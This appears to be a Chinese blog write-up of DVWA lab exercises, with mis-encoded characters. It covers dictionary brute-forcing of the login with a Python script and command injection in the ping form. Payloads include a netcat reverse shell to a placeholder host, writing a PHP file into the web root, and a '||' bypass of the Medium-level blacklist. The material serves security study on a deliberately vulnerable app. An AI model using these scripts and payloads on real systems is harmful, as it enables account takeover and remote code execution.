<h3 id=å‡†å¤‡>å‡†å¤‡</h3>
<p>æš´åŠ›ç ´è§£ä¹Ÿæœ‰æš´åŠ›ç ´è§£çš„æŠ€å·§ã€‚</p>
<p>å¯æ¥å—çš„è¾“å…¥é•¿åº¦åœ¨æœ‰é™åŒºé—´çš„æƒ…å†µä¸‹ï¼Œç›´æ¥éå†æ‰€æœ‰å­—æ¯æ•°å­—ç‰¹æ®Šå­—ç¬¦ç»„åˆæ˜¯å¾ˆéš¾é¡¶çš„ï¼Œæ¯å¤šä¸€ä½å¯èƒ½çš„å¯†ç æ•°é‡éƒ½æ˜¯æŒ‡æ•°ä¸Šå‡ã€‚æ¯”å¦‚æœ€çŸ­ 6 ä½å¯†ç ï¼Œæ¥å— ASCII 127 ä¸ªå­—ç¬¦ï¼Œå°±æœ‰ 127^6 ç§å¯èƒ½çš„å¯†ç ï¼Œæœ€é•¿ 16 ä½å¯†ç å°±æ˜¯ 127^16ï¼Œæ¯æ¬¡å°è¯•èŠ±è´¹ 1ms çš„è¯ï¼Œæ‰€éœ€æ—¶é—´å¯ä»¥è¾¾åˆ° 1.44E+38 å¹´è¿™ä¹ˆä¹…ã€‚</p>
<p>ä½†äººä¸å¯èƒ½çœŸçš„éšæœºä»asciiç è¡¨é‡ŒéšæœºæŠ½å–å­—ç¬¦å½“å¯†ç ï¼Œæ‰€ä»¥æš´åŠ›ç ´è§£å…¶å®åªéœ€è¦å°è¯•æ¯”è¾ƒå¸¸è§çš„å¯†ç å°±è¡Œï¼ˆæ¯”å¦‚ç”Ÿæ—¥ã€åå­—ã€å•è¯ã€æœ‰è§„å¾‹çš„æ•°å­—ä»¥åŠè¿™äº›å…ƒç´ çš„ç»„åˆï¼‰ï¼Œè¿˜å¯ä»¥é€‰æ‹©ä»å…¶ä»–å·²æ³„éœ²çš„ç½‘ç«™é‡Œä¿å­˜çš„ç”¨æˆ·åå¯†ç æ¥â€œæ’åº“â€ç¢°è¿æ°”ã€‚</p>
<p>è¿™ç§â€œå¼±å¯†ç â€æ„æˆçš„è¡¨åœ¨ç½‘ä¸Šè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°çš„ã€‚å®åœ¨ä¸è¡Œå¯ä»¥è‡ªå·±ç°ç¼–ä¸€ä¸ªï¼Œæ¯”å¦‚ç›´æ¥è‹±è¯­è¯å…¸ã€æ—¥æœŸã€å¸¸è§å§“åå‡‘ä¸€å‡‘ï¼Œå†æ‰¾ä¸ª 20xx å¹´ top N å¼±å¯†ç åˆèµ·æ¥å°±æ˜¯ä¸ªå¯ä»¥ä¸€æˆ˜çš„å¼±å¯†ç å­—å…¸äº†ã€‚ä¸è¿‡æœ€å¥½è¿˜æ˜¯æ‰¾ä¸ªé«˜è´¨é‡çš„å­—å…¸ï¼Œå¥½çš„å­—å…¸æ’åºèƒ½è®©æš´åŠ›ç ´å¯†ç æ›´å¿«ï¼ˆå°±æ˜¯ä»ç»Ÿè®¡ï¼ˆï¼Ÿï¼‰ä¸Šæ¥è¯´è¶Šé å‰çš„å¯†ç è¶Šå¸¸ç”¨ï¼Œè¶Šå¯èƒ½æ˜¯æ­£ç¡®çš„å¯†ç ï¼‰ã€‚</p>
<p>æŒ‘å¥½å­—å…¸ä¹‹åï¼Œå‰©ä¸‹å°±æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå­—å…¸ä»å¤´åˆ°å°¾è¯•ä¸€éäº†ã€‚è¿™é‡Œæˆ‘éšä¾¿æ‰¾äº†ä¸ª<a class=link href=https://github.com/TgeaUs/Weak-password/ target=_blank rel=noopener>Weak-password</a>ï¼ˆé‡Œé¢å¤§éƒ¨åˆ†å†…å®¹ä¸å…³å¿ƒä¹Ÿç”¨ä¸åˆ°ï¼‰ç›´æ¥ä¸‹è½½ zipã€‚</p>
<p>åˆ›å»ºä¸ª <code>dvwa-writeup</code> ä»“åº“ç”¨æ¥å­˜ dvwa é¢˜è§£è„šæœ¬ï¼ŒæŠŠ zip è§£å‹è¿›å»ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422092243142.png width=291 height=359 srcset="/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422092243142 class=gallery-image data-flex-grow=81 data-flex-basis=194px></p>
<p>å°±æ˜¯è¿™æ ·ã€‚</p>
<h3 id=ç¼–å†™è„šæœ¬>ç¼–å†™è„šæœ¬</h3>
<p>å‡ºäºä¸ªäººåå¥½ï¼Œä½¿ç”¨ python ç¼–å†™è„šæœ¬ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=c1>#</span>
<span class=c1># WriteUp: brute force [Security Level: Low]</span>
<span class=c1># Author: weak_ptr</span>
<span class=c1>#</span>
<span class=c1># NOTE: require python version &gt;= 3.6</span>
<span class=c1>#</span>

<span class=kn>import</span> <span class=nn>requests</span>

<span class=n>dictionary_list</span> <span class=o>=</span> <span class=p>[</span>
    <span class=s1>&#39;Weak-password/Password dictionary/å¸¸ç”¨å¯†ç .dict&#39;</span><span class=p>,</span>
    <span class=s1>&#39;Weak-password/Password dictionary/å›½å¤–å¸¸ç”¨å¯†ç .dict&#39;</span><span class=p>,</span>
<span class=p>]</span>

<span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>dictionary_list</span><span class=p>:</span>
    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] open dict: </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
            <span class=n>pwd</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
            <span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
                <span class=sa>f</span><span class=s1>&#39;http://localhost:8080/vulnerabilities/brute/?username=admin&amp;password=</span><span class=si>{</span><span class=n>pwd</span><span class=si>}</span><span class=s1>&amp;Login=Login#&#39;</span><span class=p>,</span>
                <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHPSESSID&#39;</span><span class=p>:</span> <span class=s1>&#39;t6kml64lvsbd8909fkrh51ove0&#39;</span><span class=p>,</span> <span class=s1>&#39;security&#39;</span><span class=p>:</span> <span class=s1>&#39;low&#39;</span><span class=p>})</span>
            <span class=c1># å¤ªç²—æš´</span>
            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[-] try password: </span><span class=si>{</span><span class=n>pwd</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
            <span class=k>if</span> <span class=s1>&#39;Username and/or password incorrect.&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>resp</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>):</span>
                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] Done! password is </span><span class=si>{</span><span class=nb>repr</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
                <span class=k>break</span>
        <span class=k>else</span><span class=p>:</span>
            <span class=k>continue</span>
        <span class=k>break</span>
</code></pre></div><p>è¿è¡Œåï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>[+] open dict: Weak-password/Password dictionary/å¸¸ç”¨å¯†ç .dict
[-] try password: admin
[-] try password: admin12
[-] try password: admin888
[-] try password: admin8
[-] try password: admin123
[-] try password: sysadmin
[-] try password: adminxxx
[-] try password: adminx
[-] try password: 6kadmin
[-] try password: base
[-] try password: feitium
[-] try password: admins
[-] try password: root
[-] try password: roots
[-] try password: test
[-] try password: test1
[-] try password: test123
[-] try password: test2
[-] try password: password
[+] Done! password is &#39;password&#39;
</code></pre></div><p>å€¼å¾—æ³¨æ„çš„æ˜¯ä¸æ¸…æ¥šæ˜¯ä¸æ˜¯å› ä¸ºæˆ‘è·‘åœ¨å®¹å™¨é‡Œè€Œä¸”è™šæ‹Ÿæœºåªåˆ†é…äº† 2C 1G çš„ç¼˜æ•…ï¼Œæ¯æ¬¡å°è¯•å¯†ç è€—æ—¶éƒ½æ¥è¿‘ 1sã€‚æ”¾åœ¨çœŸå®åœºæ™¯ä¸‹ï¼ŒæœåŠ¡ç«¯å¦‚æœé™åˆ¶äº†è¯·æ±‚é¢‘ç‡ï¼ˆæˆ–è€…æŠŠæ¯ä¸ªè¯·æ±‚éƒ½ç”¨å›ºå®šæ—¶é—´è¿”å›ï¼Œå¦‚ 1sï¼‰ï¼Œç ´è§£æˆæœ¬ä¼šéª¤ç„¶æé«˜ï¼ˆä¸è¿‡å¯¹æœåŠ¡å™¨æ¥è¯´å›ºå®šè¿”å›æ—¶é—´ä¹Ÿæ˜¯æœ‰ä¸ä½çš„æˆæœ¬çš„ï¼‰ã€‚</p>
<h3 id=æé«˜éš¾åº¦>æé«˜éš¾åº¦</h3>
<p>å°è¯•æŠŠå®‰å…¨ç­‰çº§æé«˜åˆ° Medium å’Œ High å¯¹æš´åŠ›ç ´è§£å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä¸æ¸…æ¥šæ˜¯ä¸æ˜¯å› ä¸ºè™šæ‹Ÿæœºå¤ªæ…¢ï¼Œå•çº¿ç¨‹çˆ†ç ´æ²¡è§¦å‘é¢‘ç‡é™åˆ¶ã€‚ä½†æ€»ä¹‹æ˜¯å’Œ Low éš¾åº¦ä¸‹æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚</p>
<p>æé«˜åˆ° Impossible ï¼Œå¼€å¯ PHPIDS ä¹Ÿæ— æµäºäº‹ã€‚</p>
<p>å¯è§ç³»ç»Ÿè®¾è®¡å†å®‰å…¨ä¹Ÿé¡¶ä¸ä½äººä¸ºå› ç´ ï¼Œä¿é™©ç®±é’¥åŒ™æ”¾åœ¨åœ°æ¯¯ä¸‹é¢çš„æ—¶å€™å°±ç®—ä¿é™©ç®±æ˜¯æŒ¯é‡‘åšçš„ä¹Ÿé˜²ä¸ä½è´¼å•Šã€‚</p>
<h2 id=command-injection>Command Injection</h2>
<h3 id=ä¿¡æ¯æ”¶é›†-1>ä¿¡æ¯æ”¶é›†</h3>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101128288.png width=690 height=270 srcset="/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101128288 class=gallery-image data-flex-grow=255 data-flex-basis=613px></p>
<p>ä»‹ç»æ˜¯ ping a deviceï¼Œå°è¯•è¾“å…¥ localhost æäº¤ï¼š</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101215860.png width=669 height=389 srcset="/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101215860 class=gallery-image data-flex-grow=171 data-flex-basis=412px></p>
<p>åº”è¯¥æ˜¯æ‰§è¡Œäº† <code>ping -c 4 &lt;ç”¨æˆ·è¾“å…¥></code>ã€‚å°è¯•éšä¾¿è¾“å…¥ä»€ä¹ˆä¸œè¥¿ä¼šä¸ä¼šæŠ¥é”™ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101354634.png width=673 height=263 srcset="/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101354634 class=gallery-image data-flex-grow=255 data-flex-basis=614px></p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101405231.png width=689 height=283 srcset="/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101405231 class=gallery-image data-flex-grow=243 data-flex-basis=584px></p>
<p>ç«‹åˆ»è¿”å›äº†ï¼Œä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿã€‚å†å°è¯•æ‹¼ä¸€ä¸ªå‘½ä»¤è¿›å»ï¼š<code>localhost && echo 123</code></p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101538861.png width=679 height=411 srcset="/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101538861 class=gallery-image data-flex-grow=165 data-flex-basis=396px></p>
<p>æ³¨æ„åˆ°æœ«å°¾è¾“å‡ºäº† 123ï¼Œè¯´æ˜å­˜åœ¨å‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id=å‡†å¤‡-1>å‡†å¤‡</h3>
<p>èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤çš„è¯ï¼Œæ‚¬å¿µå°±ä¸å¤§äº†ï¼Œè¿›å¯æ”»é€€å¯å®ˆã€‚</p>
<p>å¯¹ <code>/var/www/html</code> æœ‰å†™æƒé™çš„è¯å¯ä»¥ç›´æ¥å†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œæˆ–è€…é€šè¿‡ <code>nc</code> å‘½ä»¤åå¼¹ shellã€‚</p>
<p>é¡ºä¾¿ä¸€ä½“ nc åå¼¹ shell æˆ‘å¹¶ä¸ä¼šï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ã€‚æ‰€ä»¥è¿˜å¾—å…ˆå­¦ä¸€å­¦æ€ä¹ˆç”¨ nc åå¼¹ shellï¼Œåˆ°åº•å•¥åŸç†ã€‚</p>
<p>å…ˆ <code>man nc</code> çœ‹çœ‹æ‰‹å†Œã€‚</p>
<blockquote>
<p>NAME</p>
<p>â€‹ nc - TCP/IP swiss army knife</p>
<p>SYNOPSIS</p>
<p>â€‹ nc [-options] hostname port[s] [ports] &mldr;</p>
<p>â€‹ nc -l -p port [-options] [hostname] [port]</p>
</blockquote>
<p>å˜¶&mldr;&mldr;</p>
<p>TCP/IP ç‘å£«å†›åˆ€è¯¶ã€‚</p>
<blockquote>
<p>netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable &ldquo;back-end&rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or &ldquo;nc&rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.</p>
</blockquote>
<p>netcatï¼ˆæˆ‘å°±ç®¡å®ƒå«ç½‘çŒ«äº†ï¼‰ï¼Œçœ‹ä»‹ç»æ˜¯ä¸€ä¸ªå¯ä»¥è¢«å…¶ä»–ç¨‹åºæˆ–è€…è„šæœ¬é©±åŠ¨çš„â€œåç«¯â€å·¥å…·ï¼Œä¹Ÿæ˜¯ç½‘ç»œè°ƒè¯•å’Œæ¢ç´¢å·¥å…·ï¼Œèƒ½åˆ›å»ºå‡ ä¹æ‰€æœ‰ç±»å‹çš„è¿æ¥ã€‚è¿™ä¹ˆè¯´æ„Ÿè§‰è¿˜æœ‰ç‚¹è¿·æƒ‘ï¼Œçœ‹åæ–‡ä»‹ç»å°±æ¸…æ¥šå¤šäº†ã€‚</p>
<blockquote>
<p>In the simplest usage, &ldquo;nc host port&rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.</p>
<p>Netcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn&rsquo;t really care if it runs in &ldquo;client&rdquo; or &ldquo;server&rdquo; mode &ndash; it still shovels data back and forth until there isn&rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.</p>
</blockquote>
<p>æ¦‚æ‹¬ä¸‹å€¼å¾—å…³æ³¨çš„éƒ¨åˆ†ï¼Œå°±æ˜¯ç½‘çŒ«çš„ä¸¤ç§å·¥ä½œæ¨¡å¼ã€‚å®¢æˆ·ç«¯æ¨¡å¼ä¸‹æŠŠ stdin ç”¨è¿æ¥è½¬å‘ï¼ŒåŒæ—¶æŠŠæ”¶åˆ°çš„æ¶ˆæ¯å†™åˆ° stdoutï¼›æœåŠ¡å™¨æ¨¡å¼ç›‘å¬ç«¯å£ï¼ŒåŒæ ·è½¬å‘ stdin å¹¶æŠŠæ”¶åˆ°çš„æ¶ˆæ¯å†™åˆ° stdout ã€‚</p>
<p>å‰©ä¸‹æ¯”è¾ƒé‡è¦çš„å°±æ˜¯å‡ ä¸ªå‘½ä»¤è¡Œé€‰é¡¹ï¼š</p>
<ul>
<li><code>-l</code> æŒ‡ç¤ºç½‘çŒ«åœ¨æœåŠ¡å™¨æ¨¡å¼ä¸‹å·¥ä½œï¼Œç›‘å¬ä¸€ä¸ªæŒ‡å®šç«¯å£ã€‚</li>
<li><code>-e</code> æŒ‡ç¤ºç½‘çŒ«åœ¨è¿æ¥åè¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç¨‹åºçš„è¾“å…¥ä¼šå˜æˆä»è¿æ¥æ”¶åˆ°çš„ä¿¡æ¯ï¼Œç¨‹åºçš„è¾“å‡ºä¼šä»è¿æ¥å‘é€å‡ºå»ã€‚</li>
<li><code>-s</code> æŒ‡ç¤ºç½‘çŒ«ç›‘å¬çš„æœ¬åœ°åœ°å€ã€‚</li>
</ul>
<p>å¯ä»¥åšä¸ªç®€å•çš„å®éªŒç†Ÿæ‚‰ä¸‹å‘½ä»¤çš„ä½¿ç”¨ï¼Œç”¨ tmux æŒ‰ <code>ctrl+b</code> <code>"</code> <code>ctrl+b</code> <code>%</code> åˆ‡åˆ†ä¸¤ä¸ªçª—å£å‡ºæ¥ï¼Œä¸€è¾¹æ‰§è¡Œ <code>nc -l -s 0.0.0.0 -p 12345</code> å¦ä¸€è¾¹æ‰§è¡Œ <code>nc localhost 12345</code>ã€‚</p>
<p>åœ¨æ‰§è¡Œ <code>nc localhost 12345</code> çš„è¿™è¾¹ç½‘çŒ«å·¥ä½œåœ¨å®¢æˆ·ç«¯æ¨¡å¼ä¸‹ï¼Œå¯ä»¥è‡ªç”±å°è¯•åœ¨ä¸¤è¾¹é”®ç›˜è¾“å…¥ä»€ä¹ˆä¸œè¥¿ï¼Œå¦ä¸€è¾¹éƒ½ä¼šå®æ—¶å›æ˜¾ï¼š</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422134806970.png width=1253 height=110 srcset="/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422134806970 class=gallery-image data-flex-grow=1139 data-flex-basis=2733px></p>
<p>ç°åœ¨è§£é‡Šç½‘çŒ«åå‘shellå°±å¾ˆç®€å•äº†ï¼Œç”¨ <code>nc localhost 12345 -e /bin/sh</code> è¿æ¥æœåŠ¡å™¨ï¼Œæ­¤æ—¶ <code>/bin/sh</code> çš„è¾“å…¥è¾“å‡ºè¢«æ¥ç®¡ï¼Œæˆ‘ä»¬åœ¨æœåŠ¡ç«¯è¾“å…¥ <code>ls</code>ï¼Œå®¢æˆ·ç«¯çš„ <code>/bin/sh</code> è¯»åˆ°çš„è¾“å…¥å°±æ˜¯ <code>ls</code>ï¼Œ<code>/bin/sh</code> æ‰§è¡Œ <code>ls</code> çš„ç»“æœåˆè¿”å›åˆ°æœåŠ¡ç«¯â€”â€”<code>nc</code>å®¢æˆ·ç«¯å°±æˆäº†ä¸€ä¸ªç±»ä¼¼sshdçš„è§’è‰²ï¼Œæ•…ç§°åå‘è¿æ¥ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422135301963.png width=799 height=204 srcset="/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422135301963 class=gallery-image data-flex-grow=391 data-flex-basis=940px></p>
<h3 id=æ„é€ -payload>æ„é€  payload</h3>
<p>å…ˆå°è¯•ç”¨ç½‘çŒ«åå‘è¿æ¥ã€‚è¾“å…¥å†…å®¹æ”¹æˆ <code>localhost && nc &lt;ip> &lt;port> -e /bin/sh &</code> ï¼Œç­‰å¾…è¿æ¥ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422135847026.png width=341 height=41 srcset="/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422135847026 class=gallery-image data-flex-grow=831 data-flex-basis=1996px></p>
<p>æ²¡æˆåŠŸã€‚ç½‘é¡µæ˜¾ç¤º ping å‘½ä»¤çš„è¾“å‡ºï¼Œçœ‹äº†çœ¼ dvwa å®¹å™¨çš„æ—¥å¿—å‘ç°æç¤ºæ²¡æœ‰<code>nc</code>å‘½ä»¤ã€‚</p>
<p>å¥½å§ï¼Œä¸Šé¢é‚£ä¹ˆå¤šè¯åˆ°æœ€åè¿˜æ˜¯æ²¡æœ‰å±ç”¨ã€‚é‚£å°±æ”¹æˆæäº¤ä¸€ä¸ª php ä¸€å¥è¯ã€‚è¾“å…¥å†…å®¹æ”¹ä¸º <code>localhost && echo '&lt;?php phpinfo(); ?>' > /var/www/html/1.php</code>ï¼Œç„¶åè®¿é—® <code>http://localhost:8080/1.php</code>ï¼Œå‘ç°æˆåŠŸæ˜¾ç¤º phpinfoï¼Œdoneã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861.png width=1248 height=366 srcset="/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422140459588 class=gallery-image data-flex-grow=340 data-flex-basis=818px></p>
<h3 id=æé«˜éš¾åº¦medium>æé«˜éš¾åº¦ï¼šMedium</h3>
<p>åœ¨ Medium éš¾åº¦ä¸‹ ç›´æ¥æ³¨å…¥ <code>localhost && echo 123</code> ä¼šå‘ç°æ²¡æœ‰ <code>123</code> å›æ˜¾äº†ï¼Œæ—¥å¿—é‡Œå‡ºç° <code>ping: unknown host</code> çš„é”™è¯¯ï¼Œåˆæ­¥æ€€ç–‘æ˜¯å¯¹ <code>&&</code> åšäº†è¿‡æ»¤ã€‚</p>
<p>DVWA æ˜¯ä¸ªç™½ç›’ï¼Œæˆ‘ä¹Ÿä¸ç”¨çè¯•ï¼Œç›´æ¥ç‚¹å¼€ view source å®¡è®¡ä¸‹ä»£ç ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&amp;&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Determine OS and execute the ping command.
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// Windows
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// *nix
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>

    <span class=c1>// Feedback for the end user
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>æ³¨æ„åˆ°æŠŠ <code>&&</code> å’Œ <code>;</code> å»é™¤äº†ï¼Œä½†è¿™ä¸ªè¿‡æ»¤æ˜¾ç„¶æ˜¯ä¸å®Œå–„çš„ã€‚èµ·ç æˆ‘ä¸€ä¸‹å­å°±èƒ½æƒ³åˆ°è¿˜å¯ä»¥<code>||</code>æˆ–è€…<code>|</code>ï¼Œè¿˜æœ‰<code>$()</code>ä¹‹ç±»çš„æ–¹å¼ã€‚</p>
<p>æŠŠå…ˆå‰çš„ payload æ”¹æˆ <code>notexists || echo 123</code> å†æäº¤ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422153010236.png width=674 height=140 srcset="/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422153010236 class=gallery-image data-flex-grow=481 data-flex-basis=1155px></p>
<p>å¯ä»¥çœ‹åˆ° <code>echo 123</code> å·²ç»è¢«æ‰§è¡Œäº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯ get shell äº†ã€‚</p>
<h3 id=æé«˜éš¾åº¦high>æé«˜éš¾åº¦ï¼šHigh</h3>
<p>High éš¾åº¦ä¸‹ç”¨ Medium éš¾åº¦çš„ Payload ä¹Ÿèƒ½ç›´æ¥ bypassï¼Œæœ‰ç‚¹æ„å¤–ã€‚è™½ç„¶å·²ç»è¿‡äº†ï¼Œä½†è¿˜æ˜¯å†å®¡è®¡ä¸‹ High éš¾åº¦ä¸‹çš„ä»£ç ï¼Œçœ‹çœ‹å’Œ Medium éš¾åº¦æœ‰ä»€ä¹ˆä¸åŒã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
    <span class=c1>// Get input
